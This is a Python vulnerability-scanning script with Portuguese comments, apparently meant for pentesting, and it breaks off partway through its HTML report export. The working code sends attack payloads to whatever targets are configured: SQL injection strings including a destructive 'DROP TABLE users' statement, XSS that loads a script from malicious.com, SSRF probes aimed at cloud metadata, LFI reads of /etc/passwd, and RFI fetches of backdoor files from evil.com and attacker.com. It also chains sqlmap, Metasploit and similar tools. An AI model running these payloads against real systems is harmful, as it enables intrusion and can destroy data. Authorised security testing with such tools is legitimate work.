# VulnerabilityAnalyzer.py - Analisador de vulnerabilidades avançado para pentest ético (2025)
# Criado por Inflavelle (2025)
# Descrição: Script Python para análise de vulnerabilidades em hosts/URLs, com varredura de portas, testes web (SQLi, XSS, CSRF, SSRF, LFI/RFI), detecção de CMS, fingerprinting, subdomínios, APIs REST/GraphQL, integração com XSStrike/Nikto/Burp Suite/Wfuzz/OWASP ZAP/Metasploit, relatórios JSON/PDF/CSV/HTML, e GUI Tkinter moderna com abas e gráficos.
# Nota: Use apenas em sistemas com permissão explícita. Varredura não autorizada pode violar leis de cibersegurança.
# nunca estamos seguros.
import socket
import threading
import time
import requests
from bs4 import BeautifulSoup
from scapy.all import sr1, IP, ICMP
from urllib.parse import urljoin
import re
import json
import os
import platform
import smtplib
from email.mime.text import MIMEText
import dns.resolver
import subprocess
import csv
from reportlab.lib.pagesizes import letter
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table
from reportlab.lib.styles import getSampleStyleSheet
import tkinter as tk
from tkinter import ttk, messagebox
from queue import Queue
import matplotlib.pyplot as plt
from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg
import msfrpc

# Configurações personalizáveis
Settings = {
    'Targets': ['http://testphp.vulnweb.com', '127.0.0.1'],  # Lista de alvos (URLs ou IPs)
    'PortRange': (1, 1000),  # Intervalo de portas
    'Timeout': 0.5,  # Timeout por porta (segundos)
    'Threads': 200,  # Número de threads
    'LogFile': 'logs/vulnerability_analyzer.log',  # Arquivo de log
    'LogWebhook': '',  # URL de webhook (ex.: Discord)
    'SmtpServer': 'smtp.gmail.com',  # Servidor SMTP
    'SmtpPort': 587,  # Porta SMTP
    'SmtpUser': '',  # Usuário SMTP (ex.: seuemail@gmail.com)
    'SmtpPass': '',  # Senha SMTP (ex.: senha de app do Gmail)
    'SmtpTo': '',  # Destinatário do email
    'ReportDir': 'reports/',  # Diretório para relatórios
    'CheckSQLi': True,  # Testar SQL Injection
    'CheckXSS': True,  # Testar XSS
    'CheckCSRF': True,  # Testar CSRF
    'CheckSSRF': True,  # Testar SSRF
    'CheckLFI': True,  # Testar LFI
    'CheckRFI': True,  # Testar RFI
    'CheckHeaders': True,  # Verificar cabeçalhos
    'CheckCMS': True,  # Detectar CMS
    'CheckSubdomains': True,  # Varredura de subdomínios
    'CheckXSStrike': True,  # Integração com XSStrike
    'CheckNikto': True,  # Integração com Nikto
    'CheckBurp': True,  # Integração com Burp Suite
    'CheckAPI': True,  # Varredura de APIs (básica)
    'CheckAdvancedAPI': True,  # Varredura de APIs (avançada)
    'CheckGraphQL': True,  # Varredura de GraphQL
    'CheckWfuzz': True,  # Integração com Wfuzz
    'CheckZAP': True,  # Integração com OWASP ZAP
    'CheckMetasploit': True,  # Integração com Metasploit
    'FingerprintOS': True,  # Fingerprinting de SO
    'ExportJSON': True,  # Exportar relatório em JSON
    'ExportPDF': True,  # Exportar relatório em PDF
    'ExportCSV': True,  # Exportar relatório em CSV
    'ExportHTML': True,  # Exportar relatório em HTML
    'XSStrikePath': './XSStrike/xsstrike.py',  # Caminho para XSStrike
    'NiktoPath': 'nikto',  # Caminho para Nikto
    'WfuzzPath': 'wfuzz',  # Caminho para Wfuzz
    'WordlistPath': './wordlists/common.txt',  # Caminho para wordlist do Wfuzz
    'ZAPApiUrl': 'http://localhost:8080',  # URL da API do OWASP ZAP
    'ZAPApiKey': '',  # Chave da API do OWASP ZAP
    'BurpApiUrl': 'http://localhost:1337/v0.1',  # URL da API do Burp Suite
    'BurpApiKey': '',  # Chave da API do Burp Suite
    'MetasploitHost': 'localhost',  # Host do Metasploit RPC
    'MetasploitPort': 55552,  # Porta do Metasploit RPC
    'MetasploitUser': 'msf',  # Usuário do Metasploit RPC
    'MetasploitPass': '',  # Senha do Metasploit RPC
    'SubdomainList': ['www', 'mail', 'ftp', 'admin', 'test', 'api'],  # Lista de subdomínios
}

# Estado do script
ScriptState = {
    'IsRunning': False,
    'Vulnerabilities': [],
    'TotalScans': 0,
    'TotalVulnsFound': 0,
    'Results': {},  # Resultados por alvo
    'Subdomains': [],  # Subdomínios encontrados
}

# Função para enviar logs
def log_message(level, message):
    timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
    log_entry = f"[{level}] [{timestamp}] {message}"
    print(log_entry)
    
    # Log em arquivo
    os.makedirs(os.path.dirname(Settings['LogFile']), exist_ok=True)
    with open(Settings['LogFile'], 'a') as f:
        f.write(log_entry + '\n')
    
    # Log via webhook
    if Settings['LogWebhook']:
        try:
            requests.post(Settings['LogWebhook'], json={'content': log_entry}, timeout=5)
        except Exception as e:
            print(f"[ERROR] Falha ao enviar log para webhook: {e}")
    
    # Log via email
    if Settings['SmtpServer'] and Settings['SmtpUser'] and Settings['SmtpTo']:
        try:
            msg = MIMEText(log_entry)
            msg['Subject'] = f"VulnerabilityAnalyzer Alert - {level}"
            msg['From'] = Settings['SmtpUser']
            msg['To'] = Settings['SmtpTo']
            with smtplib.SMTP(Settings['SmtpServer'], Settings['SmtpPort']) as server:
                server.starttls()
                server.login(Settings['SmtpUser'], Settings['SmtpPass'])
                server.send_message(msg)
            print(f"[INFO] Alerta enviado por email para {Settings['SmtpTo']}")
        except Exception as e:
            print(f"[ERROR] Falha ao enviar email: {e}")

# Função para varredura de portas
def scan_port(host, port, protocol, result_queue):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM if protocol == 'TCP' else socket.SOCK_DGRAM)
        sock.settimeout(Settings['Timeout'])
        result = sock.connect_ex((host, port))
        sock.close()
        if result == 0:
            result_queue.put((port, protocol, 'Open'))
            log_message('INFO', f'Porta {port}/{protocol} aberta em {host}')
        ScriptState['TotalScans'] += 1
    except Exception as e:
        log_message('ERROR', f'Erro ao verificar porta {port} em {host}: {e}')

# Função para varrer portas de um alvo
def scan_ports(host, port_range, protocol, callback):
    result_queue = Queue()
    threads = []
    for port in range(port_range[0], port_range[1] + 1):
        t = threading.Thread(target=scan_port, args=(host, port, protocol, result_queue))
        threads.append(t)
        t.start()
        if len(threads) >= Settings['Threads']:
            for t in threads:
                t.join()
            threads = []
    
    for t in threads:
        t.join()
    
    while not result_queue.empty():
        port, proto, status = result_queue.get()
        ScriptState['Results'][host]['ports'].append(f'{port}/{proto}')
    callback(host, ScriptState['Results'][host]['ports'])

# Função para fingerprinting de SO com Scapy
def fingerprint_os(host):
    try:
        packet = IP(dst=host)/ICMP()
        response = sr1(packet, timeout=2, verbose=0, inter=0.1)
        if response:
            ttl = response[IP].ttl
            os_guess = 'Unknown'
            if ttl <= 64:
                os_guess = 'Linux/Unix'
            elif ttl <= 128:
                os_guess = 'Windows'
            elif ttl <= 255:
                os_guess = 'Solaris/Cisco'
            ScriptState['Vulnerabilities'].append(('OS Fingerprint', f'SO estimado: {os_guess} (TTL: {ttl})', host))
            log_message('INFO', f'SO estimado em {host}: {os_guess} (TTL: {ttl})')
            return os_guess
        return 'Unknown'
    except Exception as e:
        log_message('ERROR', f'Erro ao realizar fingerprinting em {host}: {e}')
        return 'Unknown'

# Função para verificar cabeçalhos de segurança
def check_security_headers(url):
    try:
        response = requests.get(url, timeout=5)
        headers = response.headers
        issues = []
        
        checks = {
            'Content-Security-Policy': lambda h: 'Content-Security-Policy' not in h,
            'X-Content-Type-Options': lambda h: 'X-Content-Type-Options' not in h or h['X-Content-Type-Options'] != 'nosniff',
            'X-Frame-Options': lambda h: 'X-Frame-Options' not in h or h['X-Frame-Options'] not in ['DENY', 'SAMEORIGIN'],
            'Strict-Transport-Security': lambda h: 'Strict-Transport-Security' not in h
        }
        
        for header, check in checks.items():
            if check(headers):
                issues.append(f'Falta ou inválido {header}')
        
        if issues:
            ScriptState['TotalVulnsFound'] += len(issues)
            for issue in issues:
                ScriptState['Vulnerabilities'].append(('Headers', issue, url))
                log_message('WARNING', f'Vulnerabilidade de cabeçalho: {issue} em {url}')
        else:
            log_message('INFO', f'Nenhum problema de cabeçalho em {url}')
    except Exception as e:
        log_message('ERROR', f'Erro ao verificar cabeçalhos em {url}: {e}')

# Função para detectar CMS
def detect_cms(url):
    try:
        response = requests.get(url, timeout=5)
        soup = BeautifulSoup(response.text, 'html.parser')
        cms_indicators = {
            'WordPress': ['wp-content', 'wp-includes', 'wp-json'],
            'Joomla': ['com_content', 'joomla.css'],
            'Drupal': ['drupal.js', 'sites/default']
        }
        
        for cms, indicators in cms_indicators.items():
            for indicator in indicators:
                if indicator in response.text.lower():
                    ScriptState['Vulnerabilities'].append(('CMS Detection', f'CMS detectado: {cms}', url))
                    log_message('INFO', f'CMS detectado: {cms} em {url}')
                    return cms
        log_message('INFO', f'Nenhum CMS detectado em {url}')
        return 'Unknown'
    except Exception as e:
        log_message('ERROR', f'Erro ao detectar CMS em {url}: {e}')
        return 'Unknown'

# Função para testar SQL Injection
def test_sql_injection(url):
    payloads = [
        "' OR '1'='1",
        "1; DROP TABLE users --",
        "' UNION SELECT NULL, NULL --",
        "1' AND 1=1 --",
        "' OR 'a'='a",
        "' OR 1=1--",
        "1' AND SLEEP(5)--"
    ]
    try:
        for payload in payloads:
            test_url = urljoin(url, f"?id={payload}")
            start_time = time.time()
            response = requests.get(test_url, timeout=7)
            elapsed = time.time() - start_time
            if any(error in response.text.lower() for error in ['sql', 'mysql', 'syntax error', 'database']) or (elapsed > 5 and 'SLEEP' in payload):
                ScriptState['Vulnerabilities'].append(('SQL Injection', f'Potencial SQLi com payload {payload}', test_url))
                ScriptState['TotalVulnsFound'] += 1
                log_message('CRITICAL', f'Potencial SQL Injection em {test_url}')
        
        # Integração com sqlmap (se instalado)
        try:
            result = subprocess.run(['sqlmap', '-u', url, '--batch', '--level=1'], capture_output=True, text=True, timeout=60)
            if 'vulnerable' in result.stdout.lower():
                ScriptState['Vulnerabilities'].append(('SQL Injection', 'SQLi confirmado via sqlmap', url))
                ScriptState['TotalVulnsFound'] += 1
                log_message('CRITICAL', f'SQL Injection confirmado via sqlmap em {url}')
        except Exception as e:
            log_message('WARNING', f'Sqlmap não disponível ou erro: {e}')
    except Exception as e:
        log_message('ERROR', f'Erro ao testar SQLi em {url}: {e}')

# Função para testar XSS
def test_xss(url):
    payloads = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        '" onmouseover="alert(\'XSS\')"',
        '<svg onload=alert("XSS")>',
        '<iframe src=javascript:alert("XSS")>',
        '<script src="http://malicious.com/xss.js"></script>',
        '<input type="text" value="" onfocus="alert(\'XSS\')">'
    ]
    try:
        for payload in payloads:
            test_url = urljoin(url, f"?q={payload}")
            response = requests.get(test_url, timeout=5)
            if payload in response.text:
                ScriptState['Vulnerabilities'].append(('XSS', f'Potencial XSS com payload {payload}', test_url))
                ScriptState['TotalVulnsFound'] += 1
                log_message('CRITICAL', f'Potencial XSS em {test_url}')
    except Exception as e:
        log_message('ERROR', f'Erro ao testar XSS em {url}: {e}')

# Função para testar CSRF
def test_csrf(url):
    try:
        response = requests.get(url, timeout=5)
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        for form in forms:
            if not form.find('input', {'name': re.compile(r'csrf|token', re.I)}):
                ScriptState['Vulnerabilities'].append(('CSRF', 'Formulário sem token CSRF', urljoin(url, form.get('action', ''))))
                ScriptState['TotalVulnsFound'] += 1
                log_message('WARNING', f'Formulário sem token CSRF em {url}')
    except Exception as e:
        log_message('ERROR', f'Erro ao testar CSRF em {url}: {e}')

# Função para testar SSRF
def test_ssrf(url):
    payloads = [
        'http://169.254.169.254/latest/meta-data/',
        'http://127.0.0.1:8080',
        'file:///etc/passwd',
        'http://localhost/admin'
    ]
    try:
        for payload in payloads:
            test_url = urljoin(url, f"?url={payload}")
            response = requests.get(test_url, timeout=5)
            if any(sign in response.text.lower() for sign in ['instance-id', 'metadata', 'root:', 'admin']):
                ScriptState['Vulnerabilities'].append(('SSRF', f'Potencial SSRF com payload {payload}', test_url))
                ScriptState['TotalVulnsFound'] += 1
                log_message('CRITICAL', f'Potencial SSRF em {test_url}')
    except Exception as e:
        log_message('ERROR', f'Erro ao testar SSRF em {url}: {e}')

# Função para testar LFI/RFI
def test_lfi_rfi(url):
    lfi_payloads = [
        '../../../../etc/passwd',
        '/etc/passwd',
        '../../windows/win.ini',
        '/proc/self/environ',
        '../config.php',
        '../../.htaccess'
    ]
    rfi_payloads = [
        'http://malicious.com/shell.txt',
        'https://evil.com/malware.php',
        'http://attacker.com/backdoor.php'
    ]
    try:
        for payload in lfi_payloads:
            test_url = urljoin(url, f"?file={payload}")
            response = requests.get(test_url, timeout=5)
            if any(sign in response.text.lower() for sign in ['root:', '[extensions]', 'user=', '<?php', 'AuthType']):
                ScriptState['Vulnerabilities'].append(('LFI', f'Potencial LFI com payload {payload}', test_url))
                ScriptState['TotalVulnsFound'] += 1
                log_message('CRITICAL', f'Potencial LFI em {test_url}')
        
        for payload in rfi_payloads:
            test_url = urljoin(url, f"?file={payload}")
            response = requests.get(test_url, timeout=5)
            if any(sign in response.text.lower() for sign in ['<?php', 'shell', 'backdoor']):
                ScriptState['Vulnerabilities'].append(('RFI', f'Potencial RFI com payload {payload}', test_url))
                ScriptState['TotalVulnsFound'] += 1
                log_message('CRITICAL', f'Potencial RFI em {test_url}')
    except Exception as e:
        log_message('ERROR', f'Erro ao testar LFI/RFI em {url}: {e}')

# Função para integração com XSStrike
def test_xsstrike(url):
    if not os.path.exists(Settings['XSStrikePath']):
        log_message('ERROR', f'XSStrike não encontrado em {Settings["XSStrikePath"]}. Instale-o.')
        return
    try:
        result = subprocess.run(
            ['python3', Settings['XSStrikePath'], '-u', url, '--crawl', '--level=2'],
            capture_output=True, text=True, timeout=120
        )
        if 'vulnerable' in result.stdout.lower():
            ScriptState['Vulnerabilities'].append(('XSS', f'XSS confirmado via XSStrike', url))
            ScriptState['TotalVulnsFound'] += 1
            log_message('CRITICAL', f'XSS confirmado via XSStrike em {url}: {result.stdout[:200]}...')
        else:
            log_message('INFO', f'Nenhum XSS encontrado por XSStrike em {url}')
    except Exception as e:
        log_message('ERROR', f'Erro ao executar XSStrike: {e}')

# Função para integração com Nikto
def test_nikto(url):
    try:
        report_path = os.path.join(Settings['ReportDir'], f'nikto_{int(time.time())}.json')
        result = subprocess.run(
            [Settings['NiktoPath'], '-h', url, '-output', report_path, '-Format', 'json'],
            capture_output=True, text=True, timeout=300
        )
        if os.path.exists(report_path):
            with open(report_path, 'r') as f:
                nikto_data = json.load(f)
            for vuln in nikto_data.get('vulnerabilities', []):
                ScriptState['Vulnerabilities'].append(('Nikto', vuln.get('msg', 'Unknown'), url))
                ScriptState['TotalVulnsFound'] += 1
                log_message('CRITICAL', f'Vulnerabilidade Nikto em {url}: {vuln.get("msg", "Unknown")}')
        log_message('INFO', f'Nikto varredura concluída em {url}')
    except Exception as e:
        log_message('ERROR', f'Erro ao executar Nikto: {e}')

# Função para integração com Burp Suite
def test_burp(url):
    if not Settings['BurpApiKey']:
        log_message('ERROR', 'Chave da API do Burp Suite não configurada.')
        return
    try:
        headers = {'Authorization': f'Bearer {Settings["BurpApiKey"]}'}
        response = requests.post(
            f"{Settings['BurpApiUrl']}/scan",
            headers=headers,
            json={'urls': [url]},
            timeout=10
        )
        if response.status_code == 201:
            scan_id = response.json().get('scan_id')
            log_message('INFO', f'Varredura Burp iniciada para {url}, ID: {scan_id}')
            for _ in range(60):
                status_response = requests.get(
                    f"{Settings['BurpApiUrl']}/scan/{scan_id}",
                    headers=headers,
                    timeout=5
                )
                if status_response.json().get('status') == 'completed':
                    for issue in status_response.json().get('issues', []):
                        ScriptState['Vulnerabilities'].append(('Burp Suite', issue.get('type', 'Unknown'), url))
                        ScriptState['TotalVulnsFound'] += 1
                        log_message('CRITICAL', f'Vulnerabilidade Burp em {url}: {issue.get("type", "Unknown")}')
                    break
                time.sleep(10)
        else:
            log_message('ERROR', f'Erro ao iniciar varredura Burp: {response.text}')
    except Exception as e:
        log_message('ERROR', f'Erro ao executar Burp Suite: {e}')

# Função para integração com Wfuzz
def test_wfuzz(url):
    if not os.path.exists(Settings['WordlistPath']):
        log_message('ERROR', f'Wordlist não encontrada em {Settings["WordlistPath"]}.')
        return
    try:
        report_path = os.path.join(Settings['ReportDir'], f'wfuzz_{int(time.time())}.json')
        result = subprocess.run(
            [Settings['WfuzzPath'], '-u', url, '-w', Settings['WordlistPath'], '--hc', '404', '-o', 'json', '--oF', report_path],
            capture_output=True, text=True, timeout=300
        )
        if os.path.exists(report_path):
            with open(report_path, 'r') as f:
                wfuzz_data = json.load(f)
            for entry in wfuzz_data:
                if entry.get('code') in [200, 301, 302]:
                    ScriptState['Vulnerabilities'].append(('Wfuzz', f'Endpoint encontrado: {entry.get("url")}', url))
                    ScriptState['TotalVulnsFound'] += 1
                    log_message('INFO', f'Wfuzz encontrou endpoint em {url}: {entry.get("url")}')
        log_message('INFO', f'Wfuzz varredura concluída em {url}')
    except Exception as e:
        log_message('ERROR', f'Erro ao executar Wfuzz: {e}')

# Função para integração com OWASP ZAP
def test_zap(url):
    if not Settings['ZAPApiKey']:
        log_message('ERROR', 'Chave da API do OWASP ZAP não configurada.')
        return
    try:
        params = {'apikey': Settings['ZAPApiKey']}
        response = requests.get(
            f"{Settings['ZAPApiUrl']}/JSON/ascan/action/scan/",
            params={**params, 'url': url, 'recurse': '1'},
            timeout=10
        )
        if response.status_code == 200:
            scan_id = response.json().get('scan')
            log_message('INFO', f'Varredura ZAP iniciada para {url}, ID: {scan_id}')
            for _ in range(60):
                status_response = requests.get(
                    f"{Settings['ZAPApiUrl']}/JSON/ascan/view/status/",
                    params={**params, 'scanId': scan_id},
                    timeout=5
                )
                if status_response.json().get('status') == '100':
                    alerts_response = requests.get(
                        f"{Settings['ZAPApiUrl']}/JSON/core/view/alerts/",
                        params={**params, 'baseurl': url},
                        timeout=5
                    )
                    for alert in alerts_response.json().get('alerts', []):
                        ScriptState['Vulnerabilities'].append(('OWASP ZAP', alert.get('alert', 'Unknown'), url))
                        ScriptState['TotalVulnsFound'] += 1
                        log_message('CRITICAL', f'Vulnerabilidade ZAP em {url}: {alert.get("alert", "Unknown")}')
                    break
                time.sleep(10)
        else:
            log_message('ERROR', f'Erro ao iniciar varredura ZAP: {response.text}')
    except Exception as e:
        log_message('ERROR', f'Erro ao executar OWASP ZAP: {e}')

# Função para integração com Metasploit
def test_metasploit(host, ports):
    if not Settings['MetasploitPass']:
        log_message('ERROR', 'Credenciais do Metasploit não configuradas.')
        return
    try:
        client = msfrpc.Msfrpc({'host': Settings['MetasploitHost'], 'port': Settings['MetasploitPort']})
        client.login(Settings['MetasploitUser'], Settings['MetasploitPass'])
        log_message('INFO', f'Conectado ao Metasploit RPC em {Settings["MetasploitHost"]}:{Settings["MetasploitPort"]}')
        
        # Exemplo: Testar exploit para portas abertas
        for port in ports:
            port_num = int(port.split('/')[0])
            if port_num == 80:
                module = 'auxiliary/scanner/http/http_version'
            elif port_num == 445:
                module = 'auxiliary/scanner/smb/smb_version'
            else:
                continue
            
            console = client.call('console.create', [])
            console_id = console['id']
            client.call('console.write', [console_id, f'use {module}\nset RHOSTS {host}\nrun\n'])
            time.sleep(10)
            result = client.call('console.read', [console_id])
            if 'vulnerable' in result['data'].lower() or 'open' in result['data'].lower():
                ScriptState['Vulnerabilities'].append(('Metasploit', f'Potencial vulnerabilidade em {host}:{port} ({module})', host))
                ScriptState['TotalVulnsFound'] += 1
                log_message('CRITICAL', f'Metasploit detectou vulnerabilidade em {host}:{port} ({module})')
            client.call('console.destroy', [console_id])
        log_message('INFO', f'Metasploit varredura concluída em {host}')
    except Exception as e:
        log_message('ERROR', f'Erro ao executar Metasploit: {e}')

# Função para varredura de APIs (básica)
def test_api(url):
    try:
        response = requests.get(url, timeout=5)
        soup = BeautifulSoup(response.text, 'html.parser')
        endpoints = []
        for link in soup.find_all(['a', 'form', 'link'], href=True):
            href = urljoin(url, link['href'])
            if '/api/' in href.lower():
                endpoints.append(href)
        for script in soup.find_all('script', src=True):
            src = urljoin(url, script['src'])
            if '/api/' in src.lower():
                endpoints.append(src)
        
        for endpoint in endpoints:
            response = requests.get(endpoint, timeout=5)
            if response.status_code == 200 and 'authentication' not in response.text.lower():
                ScriptState['Vulnerabilities'].append(('API', 'Possível autenticação fraca', endpoint))
                ScriptState['TotalVulnsFound'] += 1
                log_message('WARNING', f'Possível autenticação fraca em {endpoint}')
            
            test_url = urljoin(endpoint, '?id=1%27%20OR%20%271%27=%271')
            response = requests.get(test_url, timeout=5)
            if any(error in response.text.lower() for error in ['sql', 'mysql', 'syntax']):
                ScriptState['Vulnerabilities'].append(('API', 'Potencial SQLi em endpoint', test_url))
                ScriptState['TotalVulnsFound'] += 1
                log_message('CRITICAL', f'Potencial SQLi em endpoint {test_url}')
            
            test_url = urljoin(endpoint, '?q=<script>alert("XSS")</script>')
            response = requests.get(test_url, timeout=5)
            if '<script>alert("XSS")</script>' in response.text:
                ScriptState['Vulnerabilities'].append(('API', 'Potencial XSS em endpoint', test_url))
                ScriptState['TotalVulnsFound'] += 1
                log_message('CRITICAL', f'Potencial XSS em endpoint {test_url}')
    except Exception as e:
        log_message('ERROR', f'Erro ao testar API em {url}: {e}')

# Função para testes avançados de API
def test_advanced_api(url):
    try:
        endpoints = []
        response = requests.get(url, timeout=5)
        soup = BeautifulSoup(response.text, 'html.parser')
        for link in soup.find_all(['a', 'form', 'link'], href=True):
            href = urljoin(url, link['href'])
            if '/api/' in href.lower():
                endpoints.append(href)
        
        for endpoint in endpoints:
            # Testar autenticação JWT
            headers = {'Authorization': 'Bearer invalid.jwt.token'}
            response = requests.get(endpoint, headers=headers, timeout=5)
            if response.status_code == 200:
                ScriptState['Vulnerabilities'].append(('API Advanced', 'Bypass de autenticação JWT', endpoint))
                ScriptState['TotalVulnsFound'] += 1
                log_message('CRITICAL', f'Bypass de autenticação JWT em {endpoint}')
            
            # Testar rate limiting
            for i in range(10):
                response = requests.get(endpoint, timeout=5)
                if response.status_code == 429:
                    ScriptState['Vulnerabilities'].append(('API Advanced', 'Rate limiting detectado', endpoint))
                    log_message('INFO', f'Rate limiting detectado em {endpoint}')
                    break
                elif response.status_code == 200 and i == 9:
                    ScriptState['Vulnerabilities'].append(('API Advanced', 'Ausência de rate limiting', endpoint))
                    ScriptState['TotalVulnsFound'] += 1
                    log_message('WARNING', f'Ausência de rate limiting em {endpoint}')
            
            # Testar injeção de dados complexos (JSON/XML)
            payloads = [
                '{"id": "1 OR 1=1"}',
                '<xml><id>1 OR 1=1</id></xml>'
            ]
            for payload in payloads:
                response = requests.post(endpoint, data=payload, headers={'Content-Type': 'application/json'}, timeout=5)
                if any(error in response.text.lower() for error in ['sql', 'mysql', 'syntax', 'error']):
                    ScriptState['Vulnerabilities'].append(('API Advanced', f'Potencial injeção de dados ({payload[:20]}...)', endpoint))
                    ScriptState['TotalVulnsFound'] += 1
                    log_message('CRITICAL', f'Potencial injeção de dados em {endpoint}')
    except Exception as e:
        log_message('ERROR', f'Erro ao testar API avançada em {url}: {e}')

# Função para testes de GraphQL
def test_graphql(url):
    try:
        endpoints = []
        response = requests.get(url, timeout=5)
        soup = BeautifulSoup(response.text, 'html.parser')
        for link in soup.find_all(['a', 'form', 'link'], href=True):
            href = urljoin(url, link['href'])
            if 'graphql' in href.lower():
                endpoints.append(href)
        
        for endpoint in endpoints:
            # Testar introspecção
            query = {
                'query': 'query { __schema { types { name } } }'
            }
            response = requests.post(endpoint, json=query, timeout=5)
            if response.status_code == 200 and '__schema' in response.text:
                ScriptState['Vulnerabilities'].append(('GraphQL', 'Introspecção GraphQL habilitada', endpoint))
                ScriptState['TotalVulnsFound'] += 1
                log_message('WARNING', f'Introspecção GraphQL habilitada em {endpoint}')
            
            # Testar injeção
            payloads = [
                'query { users { id union(select null, null, null) } }',
                'query { test(id: "1 OR 1=1") { id } }'
            ]
            for payload in payloads:
                response = requests.post(endpoint, json={'query': payload}, timeout=5)
                if any(error in response.text.lower() for error in ['sql', 'mysql', 'syntax', 'error']):
                    ScriptState['Vulnerabilities'].append(('GraphQL', f'Potencial injeção GraphQL ({payload[:20]}...)', endpoint))
                    ScriptState['TotalVulnsFound'] += 1
                    log_message('CRITICAL', f'Potencial injeção GraphQL em {endpoint}')
    except Exception as e:
        log_message('ERROR', f'Erro ao testar GraphQL em {url}: {e}')

# Função para varredura de subdomínios
def scan_subdomains(target):
    domain = target.split('://')[-1].split('/')[0]
    for subdomain in Settings['SubdomainList']:
        try:
            sub = f"{subdomain}.{domain}"
            answers = dns.resolver.resolve(sub, 'A')
            for ip in answers:
                sub_url = f"http://{sub}"
                ScriptState['Subdomains'].append(f"{sub}: {ip}")
                log_message('INFO', f'Subdomínio encontrado: {sub} ({ip})')
                ScriptState['Results'][sub_url] = {'ports': [], 'vulns': []}
                if Settings['CheckHeaders']:
                    check_security_headers(sub_url)
                if Settings['CheckSQLi']:
                    test_sql_injection(sub_url)
                if Settings['CheckXSS']:
                    test_xss(sub_url)
                if Settings['CheckCSRF']:
                    test_csrf(sub_url)
                if Settings['CheckSSRF']:
                    test_ssrf(sub_url)
                if Settings['CheckLFI'] or Settings['CheckRFI']:
                    test_lfi_rfi(sub_url)
                if Settings['CheckXSStrike']:
                    test_xsstrike(sub_url)
                if Settings['CheckNikto']:
                    test_nikto(sub_url)
                if Settings['CheckBurp']:
                    test_burp(sub_url)
                if Settings['CheckAPI']:
                    test_api(sub_url)
                if Settings['CheckAdvancedAPI']:
                    test_advanced_api(sub_url)
                if Settings['CheckGraphQL']:
                    test_graphql(sub_url)
                if Settings['CheckWfuzz']:
                    test_wfuzz(sub_url)
                if Settings['CheckZAP']:
                    test_zap(sub_url)
        except dns.resolver.NXDOMAIN:
            continue
        except Exception as e:
            log_message('ERROR', f'Erro ao escanear subdomínio {sub}: {e}')

# Função para varrer alvos
def scan_target(target):
    ScriptState['Results'][target] = {'ports': [], 'vulns': []}
    
    if target.startswith('http'):
        if Settings['CheckHeaders']:
            check_security_headers(target)
        if Settings['CheckCMS']:
            detect_cms(target)
        if Settings['CheckSQLi']:
            test_sql_injection(target)
        if Settings['CheckXSS']:
            test_xss(target)
        if Settings['CheckCSRF']:
            test_csrf(target)
        if Settings['CheckSSRF']:
            test_ssrf(target)
        if Settings['CheckLFI'] or Settings['CheckRFI']:
            test_lfi_rfi(target)
        if Settings['CheckXSStrike']:
            test_xsstrike(target)
        if Settings['CheckNikto']:
            test_nikto(target)
        if Settings['CheckBurp']:
            test_burp(target)
        if Settings['CheckAPI']:
            test_api(target)
        if Settings['CheckAdvancedAPI']:
            test_advanced_api(target)
        if Settings['CheckGraphQL']:
            test_graphql(target)
        if Settings['CheckWfuzz']:
            test_wfuzz(target)
        if Settings['CheckZAP']:
            test_zap(target)
        if Settings['CheckSubdomains']:
            scan_subdomains(target)
    else:
        if Settings['FingerprintOS']:
            fingerprint_os(target)
        scan_ports(target, Settings['PortRange'], 'TCP', lambda h, p: test_metasploit(h, p) if Settings['CheckMetasploit'] else None)

# Função para exportar relatório em JSON
def export_json_report():
    os.makedirs(Settings['ReportDir'], exist_ok=True)
    report_path = os.path.join(Settings['ReportDir'], f'report_{int(time.time())}.json')
    report = {
        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
        'results': ScriptState['Results'],
        'subdomains': ScriptState['Subdomains'],
        'vulnerabilities': ScriptState['Vulnerabilities'],
        'total_vulns': ScriptState['TotalVulnsFound'],
        'total_scans': ScriptState['TotalScans']
    }
    with open(report_path, 'w') as f:
        json.dump(report, f, indent=2)
    log_message('INFO', f'Relatório JSON salvo em {report_path}')

# Função para exportar relatório em PDF
def export_pdf_report():
    os.makedirs(Settings['ReportDir'], exist_ok=True)
    report_path = os.path.join(Settings['ReportDir'], f'report_{int(time.time())}.pdf')
    doc = SimpleDocTemplate(report_path, pagesize=letter)
    styles = getSampleStyleSheet()
    story = []

    story.append(Paragraph('VulnerabilityAnalyzer Report', styles['Title']))
    story.append(Spacer(1, 12))
    
    story.append(Paragraph(f'Total Vulnerabilities Found: {ScriptState["TotalVulnsFound"]}', styles['Heading2']))
    story.append(Paragraph(f'Total Scans Performed: {ScriptState["TotalScans"]}', styles['Heading2']))
    story.append(Spacer(1, 12))
    
    for target, data in ScriptState['Results'].items():
        story.append(Paragraph(f'Target: {target}', styles['Heading2']))
        story.append(Spacer(1, 12))
        
        table_data = [['Type', 'Description', 'Details']]
        for vuln in data['vulns'] + [v for v in ScriptState['Vulnerabilities'] if v[2] == target]:
            table_data.append(vuln)
        
        table = Table(table_data)
        story.append(table)
        story.append(Spacer(1, 12))
    
    if ScriptState['Subdomains']:
        story.append(Paragraph('Subdomains Found:', styles['Heading2']))
        story.append(Paragraph(', '.join(ScriptState['Subdomains']), styles['Normal']))
        story.append(Spacer(1, 12))
    
    doc.build(story)
    log_message('INFO', f'Relatório PDF salvo em {report_path}')

# Função para exportar relatório em CSV
def export_csv_report():
    os.makedirs(Settings['ReportDir'], exist_ok=True)
    report_path = os.path.join(Settings['ReportDir'], f'report_{int(time.time())}.csv')
    with open(report_path, 'w', newline='') as f:
        writer = csv.writer(f)
        writer.writerow(['Timestamp', time.strftime('%Y-%m-%d %H:%M:%S')])
        writer.writerow(['Total Vulnerabilities', ScriptState['TotalVulnsFound']])
        writer.writerow(['Total Scans', ScriptState['TotalScans']])
        writer.writerow([])
        writer.writerow(['Type', 'Description', 'Details'])
        for vuln in ScriptState['Vulnerabilities']:
            writer.writerow(vuln)
        if ScriptState['Subdomains']:
            writer.writerow([])
            writer.writerow(['Subdomains Found'])
            for sub in ScriptState['Subdomains']:
                writer.writerow([sub])
    log_message('INFO', f'Relatório CSV salvo em {report_path}')

# Função para exportar relatório interativo em HTML
def export_html_report():
    os.makedirs(Settings['ReportDir'], exist_ok=True)
